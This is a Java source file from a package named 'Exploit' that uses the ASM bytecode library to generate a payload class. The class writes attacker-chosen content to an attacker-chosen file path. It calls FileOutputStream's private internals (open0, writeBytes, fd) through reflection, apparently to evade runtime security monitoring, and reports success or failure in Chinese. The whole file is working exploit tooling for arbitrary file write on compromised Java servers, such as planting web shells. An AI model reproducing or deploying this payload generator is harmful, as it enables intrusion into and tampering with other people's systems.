package top.racerz.Exploit;

import org.objectweb.asm.*;
import top.racerz.utils.StringUtil;

public class FileWrite implements Opcodes {

    public static void insert(ClassWriter cw) {
        String fileName = StringUtil.getCurrentPropertiesValue("FileWrite");
        String writeContent = StringUtil.getCurrentPropertiesValue("WriteContent");

        FieldVisitor fv;
        MethodVisitor mv;

        {
            fv = cw.visitField(ACC_PRIVATE, "result", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(12, l3);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(13, l4);
            mv.visitLdcInsn(fileName);
            mv.visitVarInsn(ASTORE, 1);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(14, l5);
            mv.visitLdcInsn(writeContent);
            mv.visitVarInsn(ASTORE, 2);
            mv.visitLabel(l0);
            mv.visitLineNumber(17, l0);
            mv.visitTypeInsn(NEW, "java/io/FileOutputStream");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/FileOutputStream", "<init>", "(Ljava/lang/String;)V", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(19, l6);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(21, l7);
            mv.visitLdcInsn("java.io.FileOutputStream");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(23, l8);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("append");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 6);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(24, l9);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(26, l10);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(29, l11);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("fd");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 7);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(30, l12);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitLineNumber(31, l13);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitTypeInsn(NEW, "java/io/FileDescriptor");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/FileDescriptor", "<init>", "()V", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(34, l14);
            mv.visitLdcInsn("java.io.FileDescriptor");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 8);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(35, l15);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitLdcInsn("attach");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/io/Closeable;"));
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 9);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLineNumber(36, l16);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l17 = new Label();
            mv.visitLabel(l17);
            mv.visitLineNumber(37, l17);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/FileOutputStream", "getFD", "()Ljava/io/FileDescriptor;", false);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLineNumber(40, l18);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("open0");
            mv.visitInsn(ICONST_2);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Boolean", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 10);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitLineNumber(41, l19);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l20 = new Label();
            mv.visitLabel(l20);
            mv.visitLineNumber(42, l20);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_2);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l21 = new Label();
            mv.visitLabel(l21);
            mv.visitLineNumber(44, l21);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("writeBytes");
            mv.visitInsn(ICONST_4);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("[B"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Integer", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Integer", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_3);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Boolean", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 11);
            Label l22 = new Label();
            mv.visitLabel(l22);
            mv.visitLineNumber(45, l22);
            mv.visitVarInsn(ALOAD, 11);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l23 = new Label();
            mv.visitLabel(l23);
            mv.visitLineNumber(46, l23);
            mv.visitVarInsn(ALOAD, 11);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_4);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitInsn(ICONST_0);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Integer", "valueOf", "(I)Ljava/lang/Integer;", false);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitInsn(ARRAYLENGTH);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Integer", "valueOf", "(I)Ljava/lang/Integer;", false);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_3);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l24 = new Label();
            mv.visitLabel(l24);
            mv.visitLineNumber(48, l24);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("close");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 12);
            Label l25 = new Label();
            mv.visitLabel(l25);
            mv.visitLineNumber(49, l25);
            mv.visitVarInsn(ALOAD, 12);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l26 = new Label();
            mv.visitLabel(l26);
            mv.visitLineNumber(50, l26);
            mv.visitVarInsn(ALOAD, 12);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l27 = new Label();
            mv.visitLabel(l27);
            mv.visitLineNumber(52, l27);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitLdcInsn("\u6587\u4ef6\u5199\u5165\u6210\u529f");
            mv.visitFieldInsn(PUTFIELD, "FileWrite", "result", "Ljava/lang/String;");
            mv.visitLabel(l1);
            mv.visitLineNumber(55, l1);
            Label l28 = new Label();
            mv.visitJumpInsn(GOTO, l28);
            mv.visitLabel(l2);
            mv.visitLineNumber(53, l2);
            mv.visitFrame(Opcodes.F_FULL, 3, new Object[]{"FileWrite", "java/lang/String", "java/lang/String"}, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 3);
            Label l29 = new Label();
            mv.visitLabel(l29);
            mv.visitLineNumber(54, l29);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitLdcInsn("\u51fa\u73b0\u9519\u8bef\uff0c\u6587\u4ef6\u5199\u5165\u53ef\u80fd\u5931\u8d25\uff01");
            mv.visitFieldInsn(PUTFIELD, "FileWrite", "result", "Ljava/lang/String;");
            mv.visitLabel(l28);
            mv.visitLineNumber(57, l28);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "FileWrite", "echo", "()V", false);
            Label l30 = new Label();
            mv.visitLabel(l30);
            mv.visitLineNumber(58, l30);
            mv.visitInsn(RETURN);
            Label l31 = new Label();
            mv.visitLabel(l31);
            mv.visitLocalVariable("proxyFos", "Ljava/io/FileOutputStream;", null, l6, l1, 3);
            mv.visitLocalVariable("contentBytes", "[B", null, l7, l1, 4);
            mv.visitLocalVariable("fos", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l8, l1, 5);
            mv.visitLocalVariable("field", "Ljava/lang/reflect/Field;", null, l9, l1, 6);
            mv.visitLocalVariable("field1", "Ljava/lang/reflect/Field;", null, l12, l1, 7);
            mv.visitLocalVariable("fd", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l15, l1, 8);
            mv.visitLocalVariable("fd_method", "Ljava/lang/reflect/Method;", null, l16, l1, 9);
            mv.visitLocalVariable("m", "Ljava/lang/reflect/Method;", null, l19, l1, 10);
            mv.visitLocalVariable("m2", "Ljava/lang/reflect/Method;", null, l22, l1, 11);
            mv.visitLocalVariable("m3", "Ljava/lang/reflect/Method;", null, l25, l1, 12);
            mv.visitLocalVariable("e", "Ljava/lang/Exception;", null, l29, l28, 3);
            mv.visitLocalVariable("this", "LFileWrite;", null, l3, l31, 0);
            mv.visitLocalVariable("path", "Ljava/lang/String;", null, l5, l31, 1);
            mv.visitLocalVariable("content", "Ljava/lang/String;", null, l0, l31, 2);
            mv.visitMaxs(6, 13);
            mv.visitEnd();
        }
    }

}
